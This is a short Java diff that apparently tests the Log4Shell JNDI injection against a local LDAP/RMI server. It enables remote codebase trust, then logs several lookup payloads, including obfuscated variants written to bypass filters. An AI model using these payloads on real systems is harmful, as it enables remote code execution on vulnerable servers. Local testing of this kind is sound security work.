@@ -7,7 +7,10 @@ public class main {
 
     public static void main(String[] args) {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
-        String s = "${jndi:ldap://127.0.0.1:1389/db7kmo}";
+//        String s = "${jndi:ldap://127.0.0.1:1389/4fw72b}";
+//        String s = "${rmi://127.0.0.1:1099/rbs0cx}";
+//        String s ="${${upper:jndi}:${lower:LDAP}://127.0.0.1:1389/wgjqi9}";
+        String s = "${${upper:jndi:ldap://127.0.0.1:1389/wgjqi9}}";
         logger.error(s);
     }
 
